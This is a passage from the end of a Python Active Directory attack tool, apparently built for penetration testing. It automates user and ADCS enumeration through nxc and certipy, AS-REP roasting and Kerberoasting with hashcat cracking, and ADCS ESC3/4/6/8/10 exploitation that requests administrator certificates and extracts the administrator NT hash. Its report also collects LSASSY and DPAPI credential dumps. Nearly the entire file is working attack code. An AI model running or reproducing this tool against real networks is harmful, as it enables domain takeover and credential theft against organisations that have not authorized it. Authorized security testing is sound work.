        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if os.path.exists(potfile) and os.path.getsize(potfile) > 0:
            cracked = []
            with open(potfile, 'r') as f:
                for line in f:
                    if line.strip():
                        parts = line.strip().split(":")
                        if len(parts) >= 2:
                            match = re.search(r'\$krb5tgs\$23\$\*([^\$]+)\$', parts[0])
                            if match:
                                user = match.group(1)
                                password = parts[-1]
                                cracked.append(f"{user}:{password}")

            if cracked:
                print(colored("\n🎉 Cracked credentials (username:password):", "green", attrs=["bold"]))
                for cred in cracked:
                    print(colored(cred, "cyan"))
                
                with open("cracked_credentials.txt", "a") as f:
                    for cred in cracked:
                        f.write(f"{cred}\n")
            else:
                print(colored("❌ No hashes cracked.", "red"))
        else:
            print(colored("❌ No hashes cracked.", "red"))
    
    except subprocess.CalledProcessError as e:
        print(colored("🚀 Hashcat completed with errors, displaying cracked hashes...", "yellow"))
        print(colored(f"Error: {e.stderr}", "red"))

        if os.path.exists(potfile) and os.path.getsize(potfile) > 0:
            cracked = []
            with open(potfile, 'r') as f:
                for line in f:
                    if line.strip():
                        parts = line.strip().split(":")
                        if len(parts) >= 2:
                            match = re.search(r'\$krb5tgs\$23\$\*([^\$]+)\$', parts[0])
                            if match:
                                user = match.group(1)
                                password = parts[-1]
                                cracked.append(f"{user}:{password}")

            if cracked:
                print(colored("\n🎉 Cracked credentials (username:password):", "green", attrs=["bold"]))
                for cred in cracked:
                    print(colored(cred, "cyan"))
                
                with open("cracked_credentials.txt", "a") as f:
                    for cred in cracked:
                        f.write(f"{cred}\n")
            else:
                print(colored("❌ No hashes cracked.", "red"))
        else:
            print(colored("❌ No hashes cracked.", "red"))

def ask_crack_hashes():
    print()
    choice = input(colored("🧨 Do you want to try to crack AS-REP hashes now ? (y/n) > ", "yellow")).strip().lower()
    if choice != "y":
        print(colored("🚫 Skipping hash cracking.", "yellow"))
        return

    print(colored("📂 Select your wordlist...", "cyan"))
    try:
        wordlist_cmd = "find /opt/lists /usr/share/wordlists /usr/share/wfuzz /usr/share/dirb -type f | fzf"
        wordlist = subprocess.check_output(wordlist_cmd, shell=True, text=True).strip()

        if not wordlist:
            print(colored("❌ No wordlist selected (fzf exited).", "red"))
            return

    except subprocess.CalledProcessError:
        print(colored("❌ Failed to launch fzf-wordlists.", "red"))
        return

    hashfile = "asreproast_output.txt"
    if not os.path.isfile(hashfile):
        print(colored(f"❌ Hash file not found: {hashfile}", "red"))
        return

    print(colored(f"🚀 Launching hashcat on {hashfile} using {wordlist}...", "magenta"))
    potfile = "hashcat.potfile"

    try:
        command = f"hashcat {hashfile} {wordlist} --potfile-path {potfile} --quiet --force"
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if not os.path.isfile(potfile):
            print(colored("❌ Potfile not found, no results to show.", "red"))
            return

        cracked = []
        with open(potfile, "r") as f:
            for line in f:
                if "$krb5asrep$" in line:
                    parts = line.strip().split(":")
                    if len(parts) >= 3:
                        match = re.search(r'\$krb5asrep\$23\$(?P<user>[^@]+)@', parts[0])
                        if match:
                            user = match.group("user")
                            password = parts[-1]
                            cracked.append(f"{user}:{password}")

        if cracked:
            print(colored("\n🎉 Cracked credentials (username:password):", "green", attrs=["bold"]))
            for cred in cracked:
                print(colored(cred, "cyan"))
            
            with open("cracked_credentials.txt", "a") as f:
                for cred in cracked:
                    f.write(f"{cred}\n")
        else:
            print(colored("❌ No hashes cracked.", "red"))

    except Exception as e:
        print(colored("❌ Unexpected error during hashcat execution:", "red"), e)

def try_exploit_esc(esc_number, ca_name=None, template_name=None):
    try:
        auth_type = "hashes" if os.getenv("NT_HASH") else "p"
        auth_value = os.getenv("NT_HASH") if auth_type == "hashes" else os.getenv("PASSWORD")
        
        domain = get_domain_name().upper()
        
        if esc_number == "ESC6":
            command = f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -upn administrator@{domain} -debug"
        elif esc_number == "ESC3":
            command = [
                f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -debug -out agent_cert.pfx",
                f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template User -on-behalf-of 'administrator@{domain}' -pfx agent_cert.pfx -debug"
            ]
            # Vérifier si le fichier de certificat existe avant de continuer
            cert_file = "agent_cert.pfx.pfx"
            if not os.path.exists(cert_file):
                print(colored(f"\n⚠️ Le fichier de certificat {cert_file} n'existe pas. Tentative de récupération...", "yellow"))
                # Ajouter une commande de récupération alternative
                command.insert(1, f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -debug -out {cert_file}")
        elif esc_number == "ESC4":
            command = [
                f"certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -save-old -debug",
                f"certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -configuration '{{template_name}}.json' -save-old -debug",
                f"certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -enable-client-auth -debug",
                f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -upn administrator@{domain} -debug"
            ]
        elif esc_number == "ESC8":
            command = [
                f"certipy ca -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -ca '{{ca_name}}' -backup -debug",
                f"certipy ca -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -ca '{{ca_name}}' -private-key -pfx '{{ca_name}}.pfx' -password 'Password123!' -debug"
            ]
            # Vérifier si le fichier de sauvegarde existe avant de continuer
            backup_file = f"{ca_name}.pfx"
            if not os.path.exists(backup_file):
                print(colored(f"\n⚠️ Le fichier de sauvegarde {backup_file} n'existe pas. Tentative de récupération...", "yellow"))
                # Ajouter une commande de récupération alternative
                command.insert(1, f"certipy ca -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -ca '{{ca_name}}' -backup -debug -out {backup_file}")
        elif esc_number in AUTOMATED_ESC_EXPLOITS:
            command = f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -upn administrator@{domain} -debug"
        else:
            print(colored(f"❌ {esc_number} cannot be automatically exploited.", "red"))
            return False

        print(colored(f"\n🎯 Attempting to exploit {esc_number}", "cyan"))
        if esc_number in ESC_VULNERABILITIES:
            print(colored(f"Description: {ESC_VULNERABILITIES[esc_number]['description']}", "yellow"))

        params = {
            "username": os.getenv("USER"),
            "auth_type": auth_type,
            "auth_value": auth_value,
            "dc_ip": os.getenv("DC_IP"),
            "domain": domain,
            "ca_name": ca_name,
            "template_name": template_name
        }

        def execute_command(cmd, retry_count=0):
            try:
                result = subprocess.run(cmd.format(**params), shell=True, capture_output=True, text=True)
                print(colored("\nOutput:", "yellow"))
                print(result.stdout)
                if result.stderr and not result.stderr.startswith("Certipy v4.8.2"):
                    print(colored("\nError:", "red"))
                    print(result.stderr)
                return result
            except Exception as e:
                if "timeout" in str(e).lower() and retry_count < 1:
                    print(colored("\n⚠️ Timeout detected, retrying once...", "yellow"))
                    return execute_command(cmd, retry_count + 1)
                raise e

        try:
            if isinstance(command, list):
                for cmd in command:
                    result = execute_command(cmd)
                    if "Successfully requested certificate" in result.stdout or "Successfully updated" in result.stdout or "Saved certificate and private key" in result.stdout:
                        print(colored("✅ Step completed successfully!", "green"))
                    elif result.returncode != 0:
                        print(colored("❌ Step failed!", "red"))
                        return False
            else:
                result = execute_command(command)
                if "Successfully requested certificate" in result.stdout:
                    print(colored("✅ Exploitation successful!", "green"))
                    if os.path.exists("administrator.pfx"):
                        hash_command = f"certipy auth -pfx administrator.pfx -dc-ip {params['dc_ip']}"
                        print(colored(f"\n🔄 Extracting hash: {hash_command}", "cyan"))
                        hash_result = subprocess.run(hash_command, shell=True, capture_output=True, text=True)
                        print(colored("\nOutput:", "yellow"))
                        print(hash_result.stdout)
                        if hash_result.stderr and not hash_result.stderr.startswith("Certipy v4.8.2"):
                            print(colored("\nError:", "red"))
                            print(hash_result.stderr)
                        
                        # Recherche du hash dans la sortie
                        for line in hash_result.stdout.split('\n'):
                            if "Got hash for" in line:
                                try:
                                    hash_parts = line.split(": ")[1].split(":")
                                    if len(hash_parts) >= 3:
                                        hash_value = hash_parts[2]
                                        print(colored(f"\nADMINISTRATOR:{hash_value}", "green", attrs=["bold"]))
                                        break
                                except Exception as e:
                                    print(colored(f"❌ Error processing hash: {str(e)}", "red"))
                    return True
                else:
                    print(colored("❌ Exploitation failed!", "red"))
                    if result.stderr and not result.stderr.startswith("Certipy v4.8.2"):
                        print(colored("\nError:", "red"))
                        print(result.stderr)
                    return False

            # Vérifier si un fichier .pfx a été généré après l'exécution des commandes
            pfx_files = [f for f in os.listdir('.') if f.endswith('.pfx') and f != 'ca.pfx']
            for pfx_file in pfx_files:
                if pfx_file == 'administrator.pfx' or pfx_file == f"{ca_name}.pfx":
                    hash_command = f"certipy auth -pfx {pfx_file} -dc-ip {params['dc_ip']}"
                    print(colored(f"\n🔄 Extracting hash from {pfx_file}: {hash_command}", "cyan"))
                    hash_result = subprocess.run(hash_command, shell=True, capture_output=True, text=True)
                    print(colored("\nOutput:", "yellow"))
                    print(hash_result.stdout)
                    if hash_result.stderr and not hash_result.stderr.startswith("Certipy v4.8.2"):
                        print(colored("\nError:", "red"))
                        print(hash_result.stderr)
                    
                    # Recherche du hash dans la sortie
                    for line in hash_result.stdout.split('\n'):
                        if "Got hash for" in line:
                            try:
                                hash_parts = line.split(": ")[1].split(":")
                                if len(hash_parts) >= 3:
                                    hash_value = hash_parts[2]
                                    print(colored(f"\nADMINISTRATOR:{hash_value}", "green", attrs=["bold"]))
                                    break
                            except Exception as e:
                                print(colored(f"❌ Error processing hash: {str(e)}", "red"))

            return True
        except Exception as e:
            print(colored(f"❌ Error during command execution: {str(e)}", "red"))
            return False
            
    except Exception as e:
        print(colored(f"❌ Error during exploitation: {str(e)}", "red"))
        return False

def process_esc_vulnerabilities(adcs_info):
    """Process and potentially exploit detected ESC vulnerabilities"""
    detected_escs = {}
    current_ca = None
    current_template = None
    
    special_cases = {
        "ESC6": {
            "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -web -upn administrator@{domain} -debug",
            "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "domain"],
            "description": "Web Enrollment interface allows specifying arbitrary SAN. Note: Only works on unpatched systems (before May 2022)."
        },
        "ESC8": {
            "command": [
                "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -backup -debug",
                "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -private-key -pfx '{{ca_name}}.pfx' -password 'Password123!' -debug"
            ],
            "requirements": ["username", "auth_type", "auth_value", "ca_name", "domain"],
            "description": "Access to CA backup keys. Steps: 1) Get CA backup 2) Extract private key."
        },
        "ESC10": {
            "command": [
                "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -issued -debug",
                "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -issued -id <cert_id> -debug"
            ],
            "requirements": ["username", "auth_type", "auth_value", "ca_name", "domain"],
            "description": "Access to archived certificates. Steps: 1) List issued certs 2) Download specific cert by ID."
        }
    }
    
    for line in adcs_info:
        if "CA Name" in line:
            current_ca = line.split(":")[1].strip()
        elif "Template Name" in line:
            current_template = line.split(":")[1].strip()
        elif "[!] Vulnerabilities" in line:
            # Next line contains vulnerabilities
            continue
        elif any(esc in line for esc in AUTOMATED_ESC_EXPLOITS.keys()):
            esc_num = line.split(":")[0].strip()
            if esc_num in AUTOMATED_ESC_EXPLOITS:
                if esc_num in special_cases:
                    detected_escs[esc_num] = {
                        "ca_name": current_ca,
                        "template_name": None,
                        "special_case": True,
                        "exploit_info": special_cases[esc_num]
                    }
                elif current_template and current_ca:
                    detected_escs[esc_num] = {
                        "ca_name": current_ca,
                        "template_name": current_template,
                        "special_case": False,
                        "exploit_info": AUTOMATED_ESC_EXPLOITS[esc_num]
                    }
    
    if detected_escs:
        print(colored("\n🔍 ESC vulnerabilities detected that can be automatically exploited:", "cyan"))
        for esc_num, info in detected_escs.items():
            params = {
                "username": os.getenv("USER"),
                "auth_type": "hashes" if os.getenv("NT_HASH") else "p",
                "auth_value": os.getenv("NT_HASH") if os.getenv("NT_HASH") else os.getenv("PASSWORD"),
                "dc_ip": os.getenv("DC_IP"),
                "domain": get_domain_name(),
                "ca_name": info["ca_name"],
                "template_name": info["template_name"]
            }
            
            requirements = info["exploit_info"]["requirements"]
            missing_params = [req for req in requirements if not params.get(req)]
            
            if not missing_params:
                print(colored(f"\n• {esc_num}", "yellow"))
                print(f"  CA: {info['ca_name']}")
                if info["template_name"]:
                    print(f"  Template: {info['template_name']}")
                
                choice = input(colored(f"\n🎯 Do you want to attempt exploitation of {esc_num}? (y/N) > ", "cyan")).strip().lower()
                if choice == 'y':
                    try_exploit_esc(esc_num, info["ca_name"], info["template_name"])
            else:
                print(colored(f"\n⚠️ {esc_num} cannot be automatically exploited - Missing parameters: {', '.join(missing_params)}", "yellow"))

def get_adcs_info():
    """Enumerate ADCS certificates using Certipy"""
    username = os.getenv("USER")
    password = os.getenv("PASSWORD")
    dc_ip = os.getenv("DC_IP")
    nt_hash = os.getenv("NT_HASH")
    
    if not dc_ip:
        print(colored("❌ DC IP not found. Running domain discovery first...", "yellow"))
        get_domain_name()
        dc_ip = os.getenv("DC_IP")
    
    if not dc_ip:
        print(colored("❌ Could not determine DC IP address", "red"))
        return []
    
    output_file = "certipy_results.txt"
    error_file = "certipy_errors.txt"
    
    # Déterminer le type d'authentification
    auth_type = "H" if nt_hash else "p"
    auth_value = nt_hash if auth_type == "H" else password
    
    # Construire la commande en fonction du type d'authentification
    if auth_type == "H":
        command = f'certipy find -vulnerable -u {username} -hashes {auth_value} -dc-ip {dc_ip} -stdout > {output_file} 2>{error_file}'
    else:
        command = f'certipy find -vulnerable -u {username} -p "{auth_value}" -dc-ip {dc_ip} -stdout > {output_file} 2>{error_file}'
    
    try:
        print(colored(f"🔍 Running Certipy command: {command}", "yellow"))
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        
        vulns = []
        
        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                lines = f.readlines()
            
            if not lines:
                print(colored("⚠️ No output from Certipy scan", "yellow"))
                return ["No results from Certipy scan"]
            
            vulns.extend([line.strip() for line in lines if line.strip()])
            
            process_esc_vulnerabilities(vulns)
            
            return vulns
        else:
            print(colored("❌ Certipy output file not found", "red"))
            return ["Certipy output file not found"]
            
    except subprocess.CalledProcessError as e:
        print(colored(f"❌ Error running Certipy: {e}", "red"))
        return ["Error running Certipy scan"]
    except Exception as e:
        print(colored(f"❌ Error: {e}", "red"))
        return ["Error during ADCS enumeration"]

def full_report():
    domain = get_domain_name()

    print(colored("\n--- Collecting ---", "yellow", attrs=["bold"]))
    print(colored("▶️  Retrieving domain users...", "cyan"))
    users = get_users()
    
    print(colored("▶️  Retrieving domain groups...", "cyan"))
    groups = get_groups()
    
    print(colored("▶️  Retrieving computers...", "cyan"))
    machines, admin_results = get_machines()
    machines_os = get_machines(with_versions=True)[0]
    
    print(colored("▶️  Retrieving logged-on users (Targeted DC)...", "cyan"))
    loggedon = get_loggedon_users()
    
    print(colored("▶️  Retrieving network interfaces (Targeted DC)...", "cyan"))
    interfaces = get_interfaces()
    
    print(colored("▶️  Retrieving password policy (Targeted DC)...", "cyan"))
    passpol = get_passpol()
    
    print(colored("▶️  Enumerating ADCS certificates...", "cyan"))
    adcs_vulns = get_adcs_info()
    
    print(colored("--- End Collecting ---\n", "yellow", attrs=["bold"]))
    
    print(colored("--- Roasting ---", "yellow", attrs=["bold"]))
    print(colored("▶️  Performing AS-REP Roasting...", "cyan"))
    asreproast = get_asreproast(users)
    if asreproast:
        print(colored(f"✅ Found {len(asreproast)} AS-REP hash(es). Saved in asreproast_hashes.txt", "green"))
    
    print(colored("▶️  Performing Kerberos Roasting...", "cyan"))
    kerberost = get_kerberost()
    if kerberost:
        print(colored(f"✅ Found {len(kerberost)} Kerberoastable hash(es). Saved in kerberoast_hashes.txt", "green"))
    print(colored("--- End Roasting ---\n", "yellow", attrs=["bold"]))

    if asreproast:
        print(colored("\n🔄 Launching AS-REP hash cracking...", "cyan"))
        ask_crack_hashes()
    
    if kerberost:
        print(colored("\n🚀 Launching Kerberos hash cracking...", "cyan"))
        ask_crack_kerberos_hashes()

    md = []
    md.append(f"# Active Directory Report - {domain}\n")

    if users:
        md.append("## 👤 Domain Users\n")
        md.extend(users)
        md.append("")

    if groups:
        md.append("## 👥 Domain Groups\n")
        md.extend(groups)
        md.append("")

    if machines:
        md.append("## 💻 Domain Machines\n")
        md.extend(machines.keys())
        md.append("")

    if machines_os:
        md.append("## 📍 Operating Systems\n")
        for host, osinfo in machines_os.items():
            md.append(f"{host}  — {osinfo}")
        md.append("")

    if admin_results:
        md.append("## 🔰 Admin Access & Privilege Escalation\n")
        for hostname, results in admin_results.items():
            md.append(f"### {hostname} ({results['ip']})\n")
            
            if results["lsassy"]:
                md.append("#### 📊 LSASSY Dump Results\n```")
                for cred in results["lsassy"]:
                    md.append(cred)
                md.append("```\n")
            
            if results["dpapi"]:
                md.append("#### 🔐 DPAPI Credentials\n```")
                for cred in results["dpapi"]:
                    md.append(cred)
                md.append("```\n")
        
        md.append("")

    if loggedon:
        md.append("## 💻 Active Users \n")
        for host, info in loggedon.items():
            md.append(f"### Logged-on {host} ({info['ip']})")
            if info["users"]:
                md.append("```")
                for user in info["users"]:
                    md.append(f"  • {user}")
                md.append("```\n")
            else:
                md.append("```")
                md.append("  • No users currently logged on")
                md.append("```\n")
        md.append("")

    if interfaces:
        md.append("## 🌐 Network Interfaces\n```")
        md.extend(interfaces)
        md.append("```\n")

    if passpol:
        md.append("## 🔐 Password Policy\n```")
        md.extend(passpol)
        md.append("```\n")

    if adcs_vulns:
        md.append("## 🔏 ADCS Enumeration")
        current_section = None
        in_code_block = False
        
        for line in adcs_vulns:
            if line.startswith("_[") and any(x in line for x in ["Certificate Authorities", "Certificate Templates"]):
                if in_code_block:
                    md.append("```\n")
                    in_code_block = False
                
                section_name = line.strip("_[]")
                md.append(f"\n### {section_name}\n")
                current_section = section_name.split()[0]
                
            elif line.startswith("Template:"):
                if in_code_block:
                    md.append("```\n")
                    in_code_block = False
                
                template_name = line.split(": ")[1]
                md.append(f"\n#### {template_name}")
                md.append("```")
                in_code_block = True
                
            elif line.startswith("_[") and any(x in line for x in ["Enrollment Flags", "Private Key Flags", "Extended Key Usage", "Enrollment Rights", "Vulnerabilities"]):
                if in_code_block:
                    md.append("```\n")
                    in_code_block = False
                
                subsection_name = line.strip("_[]")
                md.append(f"\n**{subsection_name}**")
                md.append("```")
                in_code_block = True
                
            elif line.startswith("📖 Documentation:") or line.startswith("💡 Exploitation:"):
                if in_code_block:
                    md.append("```")
                    in_code_block = False
                md.append(f"\n{line}")
                if line.startswith("💡"):
                    md.append("\n```")
                    in_code_block = True
            
            else:
                if not in_code_block:
                    md.append("```")
                    in_code_block = True
                md.append(line)
        
        if in_code_block:
            md.append("```\n")
    else:
        md.append("## 🔏 ADCS Enumeration\n```\nNo ADCS vulnerabilities found.\n```\n")

    md.append("## 🔥 AS-REP Roasting\n```")
    if asreproast:
        md.extend(asreproast)
    else:
        md.append("No AS-REP roastable account found.")
    md.append("```\n")

    md.append("## 🔥 Kerberoasting\n```")
    if kerberost:
        md.extend(kerberost)
    else:
        md.append("No Kerberos roastable account found.")
    md.append("```\n")

    md.append("## 🔑 Cracked Credentials\n")
    
    if os.path.exists("cracked_credentials.txt"):
        md.append("### Cracked Passwords\n```")
        with open("cracked_credentials.txt", 'r') as f:
            for line in f:
                if line.strip():
                    md.append(line.strip())
        md.append("```\n")
    else:
        md.append("### Cracked Passwords\n```\nNo credentials cracked yet.\n```\n")

    markdown_output = "\n".join(md)
    filename = "report.md"

    try:
        with open(filename, "w") as f:
            f.write(markdown_output + "\n")
        print(colored(f"✅ Report saved to: {filename}", "green", attrs=["bold"]))
        print(colored(f"✨ Opening report...", "magenta"))
        os.system(f"glow {filename}")
        
    except Exception as e:
        print(colored("❌ Error while saving or opening the report:", "red"), e)

    ask_to_save(markdown_output.splitlines(), filename)

def update_hosts_file():
    dc_ip = os.getenv("DC_IP")
    domain = get_domain_name()
    
    if not dc_ip or not domain:
        return

    dc_ip = dc_ip.split('/')[0]
    hosts_entry = f"{dc_ip} {domain}"

    try:
        with open('/etc/hosts', 'r') as f:
            if any(line.strip() == hosts_entry for line in f):
                return

        command = f'echo "{hosts_entry}" | sudo tee -a /etc/hosts > /dev/null'
        subprocess.run(command, shell=True, check=True)
        print(colored(f"✅ Added : {hosts_entry} to /etc/hosts", "green"))
        
    except subprocess.CalledProcessError:
        print(colored("❌ Failed to update /etc/hosts (permission denied)", "red"))
    except Exception as e:
        print(colored(f"❌ Error updating /etc/hosts: {str(e)}", "red"))

def get_users():
    command = '''nxc ldap $IP -u $USER -p $PASSWORD --users'''
    lines = run_command(command, use_network=False, use_dc=True)  # On utilise uniquement le DC
    users = []
    for line in lines:
        if (
            line.startswith("LDAP")
            and not any(excl in line for excl in [
                "-Username-", "krbtgt", "Guest", "DefaultAccount",
                "WDAGUtilityAccount", "[+]", "[*]"
            ])
        ):
            parts = line.split()
            if len(parts) >= 5:
                users.append(parts[4])
    return sorted(set(users))

def main():
    parser = argparse.ArgumentParser(description="Active Directory enumeration via SMB")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-u", "--users", action="store_true", help="List domain users")
    group.add_argument("-m", "--machines", action="store_true", help="List exposed machine names")
    group.add_argument("-o", "--os", action="store_true", help="List machines with their operating system")
    group.add_argument("-f", "--full", action="store_true", help="Show all info in Markdown format")
    group.add_argument("--groups", action="store_true", help="List domain groups")
    group.add_argument("--kerberstable", action="store_true", help="Perform Kerberos roasting only")
    group.add_argument("-a", "--asreprostable", action="store_true", help="Perform AS-REP roasting only")
    
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug mode to show all commands and outputs")
    parser.add_argument("--no-update-check", action="store_true", help="Skip update check")
    
    args = parser.parse_args()
    
    global DEBUG
    DEBUG = args.debug
    
    if not args.no_update_check:
        check_for_updates()
    
    banner()
    env = check_env_vars()
    show_env(env)
    
    if None in env.values():
        print(colored("💡 Please define all required environment variables before running this script.", "yellow", attrs=["bold"]))
        print(colored("Example: exegol-history add creds -u 'MyUser' -p 'Password123' ; exegol-history apply creds", "cyan"))
        sys.exit(1)
    
    update_hosts_file()
    
    if DEBUG:
        print(colored("🔧 Debug mode enabled - Displaying all commands and outputs", "yellow", attrs=["bold"]))
        print()
    
    if not any([args.users, args.machines, args.os, args.full, args.groups, args.kerberstable, args.asreprostable]):
        args.full = True
    
    if args.users:
        results = get_users()
        print("\n".join(results))
        ask_to_save(results, "users.txt")
    
    elif args.kerberstable:
        results = get_kerberost()
        if results:
            print("\n".join(results))
            ask_crack_kerberos_hashes()
        else:
            print(colored("No Kerberos roastable account found.", "yellow"))
            ask_to_save(results if results else ["No Kerberos roastable account found."], "kerberost.txt")
    
    elif args.asreprostable:
        users = get_users()
        results = get_asreproast(users)
        if results:
            print("\n".join(results))
            ask_crack_hashes()
        else:
            print(colored("No AS-REP roastable account found.", "yellow"))
            ask_to_save(results if results else ["No AS-REP roastable account found."], "asreproast.txt")
    
    elif args.machines:
        results = get_machines()
        print("\n".join(results.keys()))
        ask_to_save(list(results.keys()), "machines.txt")
    
    elif args.os:
        results = get_machines(with_versions=True)
        output = [f"{host} — {osinfo}" for host, osinfo in results[0].items()]
        print("\n".join(output))
        ask_to_save(output, "machines_with_os.txt")
    
    elif args.groups:
        results = get_groups()
        print("\n".join(results))
        ask_to_save(results, "groups.txt")
    
    elif args.full:
        full_report()

if __name__ == "__main__":
    main()
